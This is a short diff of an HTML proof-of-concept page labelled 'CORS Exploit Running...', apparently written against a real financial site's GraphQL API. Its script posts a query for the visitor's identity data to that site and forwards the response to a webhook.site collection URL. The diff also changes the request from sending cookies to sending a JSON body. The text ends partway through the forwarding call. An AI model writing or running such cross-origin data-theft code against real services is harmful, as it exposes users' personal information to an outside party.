@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
   <body>
     <h2>💥 CORS Exploit Running...</h2>
@@ -12,7 +11,10 @@
 
       fetch("https://www.nerdwallet.com/api/supergraph", {
   method: "POST",
-  credentials: "include"
+  headers: {
+    "Content-Type": "application/json"
+  },
+         body: JSON.stringify({ "operationName":"GetIdentityDataForWebPush","variables":{},"query":"query GetIdentityDataForWebPush {\n  rawIdentity {\n    data\n    __typename\n  }\n}\n" })
 })
 .then(res => res.text())
 .then(data => fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
